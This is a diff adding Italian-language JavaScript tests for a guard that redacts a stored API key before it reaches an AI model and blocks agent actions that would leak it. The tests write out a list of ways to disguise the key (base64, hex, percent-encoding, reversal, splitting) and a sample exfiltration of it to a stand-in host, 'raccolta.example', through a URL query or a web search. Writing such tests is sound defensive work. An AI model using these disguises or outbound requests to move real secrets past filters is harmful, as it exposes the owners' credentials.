@@ -630,6 +630,38 @@ describe('i segreti custoditi non arrivano a un modello', () => {
     assert.equal(G.oscuraSegreti(m, [CHIAVE]), m);
   });
 
+  // Un comando può stampare il file delle impostazioni in qualunque forma: travestito, il segreto resta segreto.
+  const b64 = Buffer.from(JSON.stringify({ apiKeys: { openrouter: CHIAVE } })).toString('base64');
+  const travestimenti = {
+    'in base64': b64,
+    'in base64 a righe': b64.match(/.{1,20}/g).join('\n'),
+    'in base64 tagliato a metà': b64.slice(5),
+    'in esadecimale': Buffer.from(`chiave=${CHIAVE}`).toString('hex'),
+    'in percentuale': encodeURIComponent(CHIAVE).replace(/-/g, '%2D'),
+    'in maiuscolo': CHIAVE.toUpperCase(),
+    'al contrario': [...CHIAVE].reverse().join(''),
+    'una lettera per volta': [...CHIAVE].join(' '),
+    'a capo ogni sette caratteri': CHIAVE.match(/.{1,7}/g).join('\n'),
+  };
+  for (const [nome, forma] of Object.entries(travestimenti)) {
+    test(`la chiave custodita ${nome} non arriva al modello e non esce`, () => {
+      const fuori = G.oscuraSegreti([{ role: 'tool', content: `uscita:\n${forma}\nfine` }], [CHIAVE]);
+      assert.equal(fuori[0].content, `uscita:\n${G.OSCURATO}\nfine`);
+      for (const a of [{ type: 'NAVIGA', url: `https://raccolta.example/?k=${encodeURIComponent(forma)}` }, { type: 'CERCA_WEB', query: forma }]) {
+        assert.equal(X.valutaUscita(a, { segreti: SEGRETI }).blocca, true, `${a.type} ${nome}`);
+      }
+    });
+  }
+
+  test('il testo comune e le foto passano intatti, e in fretta', () => {
+    const lungo = 'Lorem ipsum https://example.com/a/b?id=abcdef1234567890 aGVsbG8gd29ybGQgZnJvbSBmaWxv 6c6f72656d20697073756d\n'.repeat(5000);
+    const foto = `data:image/png;base64,${Buffer.alloc(300000, 7).toString('base64')}`;
+    const m = [{ role: 'user', content: [{ type: 'text', text: lungo }, { type: 'image_url', image_url: { url: foto } }] }];
+    const t0 = Date.now();
+    assert.equal(G.oscuraSegreti(m, [CHIAVE]), m);
+    assert.ok(Date.now() - t0 < 2000);
+  });
+
   test('il cancello dei modelli manda i messaggi oscurati', async () => {
     const visti = [];
     globalThis.SN_PROVIDERS = {
